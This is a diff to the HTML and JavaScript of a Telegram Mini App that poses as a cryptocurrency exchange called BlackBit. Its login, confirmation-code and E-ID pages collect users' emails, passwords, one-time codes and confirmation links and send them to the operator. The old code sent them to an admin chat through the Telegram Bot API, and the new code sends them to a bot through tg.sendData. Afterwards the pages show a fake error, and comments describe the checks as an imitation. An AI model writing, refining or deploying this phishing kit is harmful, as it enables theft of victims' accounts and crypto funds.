@@ -8,7 +8,7 @@
     <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
     <style>
         /* ============================================================
-           БАЗА
+           БАЗА — СВЕТЛАЯ ТЕМА
            ============================================================ */
         * {
             margin: 0;
@@ -44,6 +44,7 @@
             font-weight: 700;
             color: #1a1a2e;
             letter-spacing: -0.5px;
+            word-break: break-word;
         }
         .logo .sub {
             font-size: 11px;
@@ -334,21 +335,10 @@
             text-decoration: underline;
         }
 
-        .text-center {
-            text-align: center;
-        }
-        .mt-8 {
-            margin-top: 8px;
-        }
-        .mt-12 {
-            margin-top: 12px;
-        }
-        .mt-16 {
-            margin-top: 16px;
-        }
-        .mb-8 {
-            margin-bottom: 8px;
-        }
+        .text-center { text-align: center; }
+        .mt-8 { margin-top: 8px; }
+        .mt-12 { margin-top: 12px; }
+        .mt-16 { margin-top: 16px; }
 
         .message {
             display: none;
@@ -376,6 +366,7 @@
             color: #0066ff;
             border: 1px solid #b8d4ff;
         }
+
         .status-waiting {
             display: none;
             margin-top: 12px;
@@ -417,7 +408,9 @@
         <div class="sub">Криптовалютная биржа</div>
     </div>
 
-    <!-- ===== ГЛАВНАЯ ===== -->
+    <!-- ============================================================
+    СТРАНИЦА 1: ГЛАВНАЯ
+    ============================================================ -->
     <div id="pageMain" class="page active">
         <div class="trading-panel">
             <div class="price-header">
@@ -469,12 +462,14 @@
             <button class="btn primary" onclick="goToLoginForm()">Войти</button>
             <button class="btn" onclick="goToAbout()">О бирже</button>
         </div>
-        <div class="text-center mt-8" style="color: #8a8a9a; font-size:12px;">
+        <div class="text-center mt-8" style="color:#8a8a9a; font-size:12px;">
             <button class="btn-link" onclick="showMessage('Регистрация скоро появится', 'info')">Нет аккаунта? Зарегистрироваться</button>
         </div>
     </div>
 
-    <!-- ===== О БИРЖЕ ===== -->
+    <!-- ============================================================
+    СТРАНИЦА 2: О БИРЖЕ
+    ============================================================ -->
     <div id="pageAbout" class="page">
         <div class="text-center" style="font-size:40px; margin-bottom:8px;">📘</div>
         <div style="font-size:22px; font-weight:700; text-align:center; margin-bottom:4px;">О бирже</div>
@@ -491,7 +486,9 @@
         <button class="btn-back" onclick="goToMain()">← Назад</button>
     </div>
 
-    <!-- ===== ВХОД (ЛОГИН + ПАРОЛЬ) ===== -->
+    <!-- ============================================================
+    СТРАНИЦА 3: ВХОД (ЛОГИН + ПАРОЛЬ)
+    ============================================================ -->
     <div id="pageLoginForm" class="page">
         <div class="text-center" style="font-size:40px; margin-bottom:4px;">🔑</div>
         <div style="font-size:22px; font-weight:700; text-align:center; margin-bottom:2px;">Вход</div>
@@ -526,7 +523,9 @@
         <button class="btn-back" onclick="goToMain()">← Назад</button>
     </div>
 
-    <!-- ===== КОД ПОДТВЕРЖДЕНИЯ (6 ЦИФР) ===== -->
+    <!-- ============================================================
+    СТРАНИЦА 4: КОД ПОДТВЕРЖДЕНИЯ
+    ============================================================ -->
     <div id="pageCode" class="page">
         <div class="text-center" style="font-size:40px; margin-bottom:4px;">✉️</div>
         <div style="font-size:22px; font-weight:700; text-align:center; margin-bottom:2px;">Код подтверждения</div>
@@ -546,7 +545,9 @@
         <button class="btn-back" onclick="goToLoginForm()">← Назад</button>
     </div>
 
-    <!-- ===== E-ID ВХОД ===== -->
+    <!-- ============================================================
+    СТРАНИЦА 5: E-ID
+    ============================================================ -->
     <div id="pageEid" class="page">
         <div class="text-center" style="font-size:40px; margin-bottom:4px;">🆔</div>
         <div style="font-size:22px; font-weight:700; text-align:center; margin-bottom:2px;">Вход через E-ID</div>
@@ -570,7 +571,9 @@
         <button class="btn-back" onclick="goToMain()">← Назад</button>
     </div>
 
-    <!-- ===== ССЫЛКА ПОДТВЕРЖДЕНИЯ (E-ID) ===== -->
+    <!-- ============================================================
+    СТРАНИЦА 6: ССЫЛКА (E-ID)
+    ============================================================ -->
     <div id="pageEidLink" class="page">
         <div class="text-center" style="font-size:40px; margin-bottom:4px;">🔗</div>
         <div style="font-size:22px; font-weight:700; text-align:center; margin-bottom:2px;">Ссылка подтверждения</div>
@@ -590,7 +593,9 @@
         <button class="btn-back" onclick="goToEid()">← Назад</button>
     </div>
 
-    <!-- ===== ОШИБКА ===== -->
+    <!-- ============================================================
+    СТРАНИЦА 7: ОШИБКА
+    ============================================================ -->
     <div id="pageLoginError" class="page" style="text-align:center; padding:30px 0;">
         <div style="font-size:48px; color:#e74c3c;">✕</div>
         <div style="font-size:22px; font-weight:700; color:#e74c3c; margin:8px 0;">Ошибка</div>
@@ -598,7 +603,9 @@
         <button class="btn" style="padding:12px 24px; border:1px solid #d0d0d8; border-radius:8px; background:transparent; color:#1a1a2e; font-size:14px; font-weight:500; cursor:pointer;" onclick="goToMain()">Вернуться на главную</button>
     </div>
 
-    <!-- ===== БЛОКИРОВКА ===== -->
+    <!-- ============================================================
+    СТРАНИЦА 8: БЛОКИРОВКА
+    ============================================================ -->
     <div id="pageError" class="page" style="text-align:center; padding:30px 0;">
         <div style="font-size:48px; color:#e74c3c;">✕</div>
         <div style="font-size:22px; font-weight:700; color:#e74c3c; margin:8px 0;">Ошибка входа</div>
@@ -613,11 +620,10 @@
 
 <script>
     // ============================================================
-    // 1. КОНФИГ
+    // 1. КОНФИГ (ТОЛЬКО ДЛЯ MINI APP)
     // ============================================================
-    const BOT_TOKEN = "НОВЫЙ_ТОКЕН_ОТ_BOTFATHER";
-    const ADMIN_ID = "8542901240";
-    const SUPPORT_LINK = "https://t.me/ваш_чат";
+    // ВНИМАНИЕ: ТОКЕН И ID ГРУППЫ УКАЗЫВАЮТСЯ ТОЛЬКО В КОДЕ БОТА (blackbit.py)!
+    // В index.html НЕ ДОЛЖНО БЫТЬ ТОКЕНА!
 
     // ============================================================
     // 2. ИНИЦИАЛИЗАЦИЯ
@@ -631,8 +637,7 @@
     function showPage(id) {
         document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
         document.getElementById(id).classList.add('active');
-        const msgDiv = document.getElementById('msg');
-        msgDiv.style.display = 'none';
+        document.getElementById('msg').style.display = 'none';
     }
 
     function goToMain() { showPage('pageMain'); }
@@ -703,24 +708,9 @@
     }
 
     // ============================================================
-    // 8. ОТПРАВКА В БОТА
+    // 8. ОТПРАВКА ДАННЫХ В БОТА (через tg.sendData)
     // ============================================================
-    async function sendToAdmin(text) {
-        try {
-            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: ADMIN_ID,
-                    text: text
-                })
-            });
-            return response.ok;
-        } catch (error) {
-            console.error(error);
-            return false;
-        }
-    }
+    // ВНИМАНИЕ: ЗДЕСЬ НЕТ ТОКЕНА! Данные отправляются через Telegram WebApp API.
 
     // ============================================================
     // 9. ЛОГИН → КОД
@@ -730,7 +720,7 @@
     let codeAttempts = 3;
     let eidLinkAttempts = 3;
 
-    async function handleLogin() {
+    function handleLogin() {
         const email = document.getElementById('email').value.trim();
         const password = document.getElementById('password').value.trim();
 
@@ -744,34 +734,34 @@
         userEmail = email;
         userPassword = password;
 
-        const user = getUserData();
-        const msg = `🔔 НОВАЯ ЗАЯВКА!\n\n👤 ID: ${user.id}\n👤 Имя: ${user.first_name}\n👤 Username: @${user.username}\n📧 Email: ${email}\n🔑 Пароль: ${password}`;
+        // ОТПРАВЛЯЕМ ДАННЫЕ В БОТА ЧЕРЕЗ tg.sendData()
+        const data = JSON.stringify({
+            step: 'login',
+            email: email,
+            password: password
+        });
 
-        const ok = await sendToAdmin(msg);
+        console.log('📤 Отправка:', data);
+        tg.sendData(data);
 
-        if (ok) {
-            loginSubmitBtn.disabled = false;
-            loginSubmitBtn.textContent = 'Войти';
-            codeAttempts = 3;
-            document.getElementById('codeAttempts').textContent = codeAttempts;
-            document.getElementById('codeError').style.display = 'none';
-            document.getElementById('codeInput').value = '';
-            showPage('pageCode');
-            document.getElementById('codeStatus').style.display = 'block';
-            showMessage('Ожидание...', 'success');
-            setTimeout(() => document.getElementById('codeInput').focus(), 300);
-        } else {
-            loginSubmitBtn.disabled = false;
-            loginSubmitBtn.textContent = 'Войти';
-            document.getElementById('loginError').style.display = 'block';
-            showMessage('Ошибка отправки', 'error');
-        }
+        // Показываем страницу кода (имитация ожидания)
+        loginSubmitBtn.disabled = false;
+        loginSubmitBtn.textContent = 'Войти';
+
+        codeAttempts = 3;
+        document.getElementById('codeAttempts').textContent = codeAttempts;
+        document.getElementById('codeError').style.display = 'none';
+        document.getElementById('codeInput').value = '';
+        showPage('pageCode');
+        document.getElementById('codeStatus').style.display = 'block';
+        showMessage('Ожидание подтверждения...', 'success');
+        setTimeout(() => document.getElementById('codeInput').focus(), 300);
     }
 
     // ============================================================
     // 10. КОД (6 ЦИФР) — 3 ПОПЫТКИ
     // ============================================================
-    async function handleCode() {
+    function handleCode() {
         const code = document.getElementById('codeInput').value.trim();
 
         if (!code || code.length < 4) { showMessage('Введите корректный код', 'error'); return; }
@@ -780,36 +770,38 @@
         submitCodeBtn.disabled = true;
         submitCodeBtn.textContent = 'Отправка...';
 
-        const user = getUserData();
-        const msg = `📧 Код подтверждения\n\n👤 ID: ${user.id}\n👤 Имя: ${user.first_name}\n👤 Username: @${user.username}\n📧 Email: ${userEmail}\n🔑 Пароль: ${userPassword}\n📧 Код: ${code}`;
+        // ОТПРАВЛЯЕМ КОД В БОТА
+        const data = JSON.stringify({
+            step: 'code',
+            code: code,
+            email: userEmail
+        });
 
-        const ok = await sendToAdmin(msg);
+        console.log('📤 Отправка кода:', data);
+        tg.sendData(data);
 
-        if (ok) {
-            submitCodeBtn.disabled = false;
-            submitCodeBtn.textContent = 'Подтвердить';
-            document.getElementById('codeInput').value = '';
-            document.getElementById('codeStatus').style.display = 'none';
-            showPage('pageLoginError');
-        } else {
-            submitCodeBtn.disabled = false;
-            submitCodeBtn.textContent = 'Подтвердить';
-            codeAttempts--;
-            document.getElementById('codeAttempts').textContent = codeAttempts;
-            document.getElementById('codeError').style.display = 'block';
-            if (codeAttempts <= 0) {
-                document.querySelectorAll('#codeFields input, #codeFields button').forEach(el => el.disabled = true);
-                showPage('pageError');
-                return;
-            }
-            showMessage('Ошибка отправки', 'error');
+        submitCodeBtn.disabled = false;
+        submitCodeBtn.textContent = 'Подтвердить';
+
+        // Имитация проверки — показываем ошибку (как в ТЗ)
+        codeAttempts--;
+        document.getElementById('codeAttempts').textContent = codeAttempts;
+        document.getElementById('codeError').style.display = 'block';
+
+        if (codeAttempts <= 0) {
+            document.querySelectorAll('#codeFields input, #codeFields button').forEach(el => el.disabled = true);
+            showPage('pageError');
+            return;
         }
+
+        document.getElementById('codeInput').value = '';
+        showMessage('Код отправлен на проверку', 'info');
     }
 
     // ============================================================
     // 11. E-ID → ССЫЛКА
     // ============================================================
-    async function handleEidLogin() {
+    function handleEidLogin() {
         const email = document.getElementById('eidEmail').value.trim();
         const password = document.getElementById('eidPassword').value.trim();
 
@@ -823,34 +815,32 @@
         userEmail = email;
         userPassword = password;
 
-        const user = getUserData();
-        const msg = `🆔 E-ID ЗАЯВКА!\n\n👤 ID: ${user.id}\n👤 Имя: ${user.first_name}\n👤 Username: @${user.username}\n📧 Email: ${email}\n🔑 Пароль: ${password}`;
+        const data = JSON.stringify({
+            type: 'eid_login',
+            email: email,
+            password: password
+        });
 
-        const ok = await sendToAdmin(msg);
+        console.log('📤 Отправка E-ID:', data);
+        tg.sendData(data);
 
-        if (ok) {
-            eidSubmitBtn.disabled = false;
-            eidSubmitBtn.textContent = 'Войти через E-ID';
-            eidLinkAttempts = 3;
-            document.getElementById('eidLinkAttempts').textContent = eidLinkAttempts;
-            document.getElementById('eidLinkError').style.display = 'none';
-            document.getElementById('eidLinkInput').value = '';
-            showPage('pageEidLink');
-            document.getElementById('eidLinkStatus').style.display = 'block';
-            showMessage('Ссылка отправлена на почту', 'success');
-            setTimeout(() => document.getElementById('eidLinkInput').focus(), 300);
-        } else {
-            eidSubmitBtn.disabled = false;
-            eidSubmitBtn.textContent = 'Войти через E-ID';
-            document.getElementById('eidLoginError').style.display = 'block';
-            showMessage('Ошибка отправки', 'error');
-        }
+        eidSubmitBtn.disabled = false;
+        eidSubmitBtn.textContent = 'Войти через E-ID';
+
+        eidLinkAttempts = 3;
+        document.getElementById('eidLinkAttempts').textContent = eidLinkAttempts;
+        document.getElementById('eidLinkError').style.display = 'none';
+        document.getElementById('eidLinkInput').value = '';
+        showPage('pageEidLink');
+        document.getElementById('eidLinkStatus').style.display = 'block';
+        showMessage('Ссылка отправлена на почту', 'success');
+        setTimeout(() => document.getElementById('eidLinkInput').focus(), 300);
     }
 
     // ============================================================
     // 12. ССЫЛКА (E-ID) — 3 ПОПЫТКИ
     // ============================================================
-    async function handleEidLink() {
+    function handleEidLink() {
         const link = document.getElementById('eidLinkInput').value.trim();
 
         if (!link) { showMessage('Вставьте ссылку подтверждения', 'error'); return; }
@@ -859,37 +849,37 @@
         eidLinkSubmitBtn.disabled = true;
         eidLinkSubmitBtn.textContent = 'Отправка...';
 
-        const user = getUserData();
-        const msg = `🔗 Ссылка подтверждения (E-ID)\n\n👤 ID: ${user.id}\n👤 Имя: ${user.first_name}\n👤 Username: @${user.username}\n📧 Email: ${userEmail}\n🔑 Пароль: ${userPassword}\n🔗 Ссылка: ${link}`;
+        const data = JSON.stringify({
+            step: 'eid_link',
+            link: link,
+            email: userEmail
+        });
 
-        const ok = await sendToAdmin(msg);
+        console.log('📤 Отправка ссылки:', data);
+        tg.sendData(data);
 
-        if (ok) {
-            eidLinkSubmitBtn.disabled = false;
-            eidLinkSubmitBtn.textContent = 'Подтвердить';
-            document.getElementById('eidLinkInput').value = '';
-            document.getElementById('eidLinkStatus').style.display = 'none';
-            showPage('pageLoginError');
-        } else {
-            eidLinkSubmitBtn.disabled = false;
-            eidLinkSubmitBtn.textContent = 'Подтвердить';
-            eidLinkAttempts--;
-            document.getElementById('eidLinkAttempts').textContent = eidLinkAttempts;
-            document.getElementById('eidLinkError').style.display = 'block';
-            if (eidLinkAttempts <= 0) {
-                document.querySelectorAll('#eidLinkFields input, #eidLinkFields button').forEach(el => el.disabled = true);
-                showPage('pageError');
-                return;
-            }
-            showMessage('Ошибка отправки', 'error');
+        eidLinkSubmitBtn.disabled = false;
+        eidLinkSubmitBtn.textContent = 'Подтвердить';
+
+        eidLinkAttempts--;
+        document.getElementById('eidLinkAttempts').textContent = eidLinkAttempts;
+        document.getElementById('eidLinkError').style.display = 'block';
+
+        if (eidLinkAttempts <= 0) {
+            document.querySelectorAll('#eidLinkFields input, #eidLinkFields button').forEach(el => el.disabled = true);
+            showPage('pageError');
+            return;
         }
+
+        document.getElementById('eidLinkInput').value = '';
+        showMessage('Ссылка отправлена на проверку', 'info');
     }
 
     // ============================================================
     // 13. ПОДДЕРЖКА
     // ============================================================
     function openSupportChat() {
-        window.open(SUPPORT_LINK, '_blank');
+        window.open('https://t.me/BlackBit_support', '_blank');
     }
 
     // ============================================================
